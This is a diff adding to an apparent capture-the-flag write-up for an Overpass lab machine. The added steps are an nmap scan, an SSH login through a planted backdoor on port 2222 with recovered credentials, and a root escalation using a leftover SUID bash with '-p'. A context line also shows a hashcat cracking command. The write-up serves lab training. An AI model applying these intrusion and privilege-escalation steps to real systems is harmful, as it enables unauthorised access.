@@ -131,3 +131,81 @@ Crack with `hashcat` using mode `1710` for `sha512($pass.$salt)`:
     # hashcat --force -m 1710 -a 0 overpasshash.txt /usr/share/wordlists/rockyou.tx
 
 ## Hack back in
+
+Scan:
+
+```text
+# nmap -sC -sV 10.10.199.98 -vv
+...
+PORT     STATE SERVICE REASON  VERSION
+22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e4:3a:be:ed:ff:a7:02:d2:6a:d6:d0:bb:7f:38:5e:cb (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCytc0lfgdX4r5ZxA8cr9Qi/66ppcB+fyEtT75IUtKC32Y/rpvBfFGRg9YxHVhKQKBDh1KlgXL3hJTJH1aqjEPtwXORQx+QmK5yFFQa524mKj3WzFZswUcDTk4s4F+m761x+QZMcb//UJhWuqiZ2QV+GW1UJsawrFhK3nogzIQ/eomxxR6TodNx2z2CzVahLULWcQjAMOKPAlqF5vsaoWk39Y4u9JDqA2JdEI2//kIb4RjuMbZDOtUDCgPypTCMgLKzIzAZQ54nWsHoUHoGUdPlon1mkVKgno/9cjZVwqveqQpQpO3DrQpjdB6xiCzBz34H9iUMvCEgJab64WkIGLGH
+|   256 fc:6f:22:c2:13:4f:9c:62:4f:90:c9:3a:7e:77:d6:d4 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGidEthZX/MDeUCmzLRQlezisPE1OceyHa6QBfwGnWirEYCdHM68kMGFlNJODkA7dunY+TUARD5WcjXMAN1iw7A=
+|   256 15:fd:40:0a:65:59:a9:b5:0e:57:1b:23:0a:96:63:05 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPQ1lZqbCdY81xFaGZ1fwaVxJExe5+meLXraNAjwWTAm
+80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: LOL Hacked
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+2222/tcp open  ssh     syn-ack OpenSSH 8.2p1 Debian 4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 a2:a6:d2:18:79:e3:b0:20:a2:4f:aa:b6:ac:2e:6b:f2 (RSA)
+|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDlwW5RS5iWPR+x1AVz4TAWAr/fSvF3KC16voiHSUImF8fNiWT4Pcb5KADkmhssq4amO2uyN+gF9KpEbXrVj63hKdkJrF4lQnzlxX8mHeeg9CLWA1/zI1BZ8TDmC9h45K3DwJjcD8zb56JPDi20PoIjVe3zUe3lf2geBxsAyhR5Cs4vWWUBzyocdkFDu+QXirPJv5lxcuiPhUVyDQZtHOK9evrXOOpeZiYgpqxcYTqHk5JcZbrV1sTNU8mkQiJXuVDQO+hOoOO7yES3reMv0pDXtc/Cfz5ZHJuAaGhU/fawIjUBlIeXY3wjUJe3UYgm1qE/idyq+9rU5TVApjxo+mjR
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+...
+Nmap done: 1 IP address (1 host up) scanned in 39.63 seconds
+```
+
+Hack back in via the backdoor using name and password found.
+
+If you get:
+
+    # ssh james@10.10.98.146 -p 2222 
+    Unable to negotiate with 10.10.98.146 port 2222: no matching host key type found. Their offer: ssh-rsa
+
+Add the following two lines to `/etc/ssh/ssh_config` first:
+
+```text
+PubkeyAcceptedAlgorithms +ssh-rsa
+HostkeyAlgorithms +ssh-rsa
+```
+
+Again:
+
+    # ssh james@10.10.98.146 -p 2222          
+    The authenticity of host '[10.10.98.146]:2222 ([10.10.98.146]:2222)' can't be established.
+    ...
+    james@10.10.98.146's password: 
+    To run a command as administrator (user "root"), use "sudo <command>".
+    See "man sudo_root" for details.
+
+Get the flag from `user.txt`:
+
+    $ cd ..
+    james@overpass-production:/home/james$ ls -la
+    total 1136
+    drwxr-xr-x 7 james james    4096 Jul 22  2020 .
+    drwxr-xr-x 7 root  root     4096 Jul 21  2020 ..
+    lrwxrwxrwx 1 james james       9 Jul 21  2020 .bash_history -> /dev/null
+    -rw-r--r-- 1 james james     220 Apr  4  2018 .bash_logout
+    -rw-r--r-- 1 james james    3771 Apr  4  2018 .bashrc
+    drwx------ 2 james james    4096 Jul 21  2020 .cache
+    drwx------ 3 james james    4096 Jul 21  2020 .gnupg
+    drwxrwxr-x 3 james james    4096 Jul 22  2020 .local
+    -rw------- 1 james james      51 Jul 21  2020 .overpass
+    -rw-r--r-- 1 james james     807 Apr  4  2018 .profile
+    -rw-r--r-- 1 james james       0 Jul 21  2020 .sudo_as_admin_successful
+    -rwsr-sr-x 1 root  root  1113504 Jul 22  2020 .suid_bash
+    drwxrwxr-x 3 james james    4096 Jul 22  2020 ssh-backdoor
+    -rw-rw-r-- 1 james james      38 Jul 22  2020 user.txt
+    drwxrwxr-x 7 james james    4096 Jul 21  2020 www
+    james@overpass-production:/home/james$ cat user.txt
+
+And use the conveniently left `.suid_bash`: 
+
+    james@overpass-production:/home/james$ ./.suid_bash -p
+    .suid_bash-4.4# cat /root/root.txt
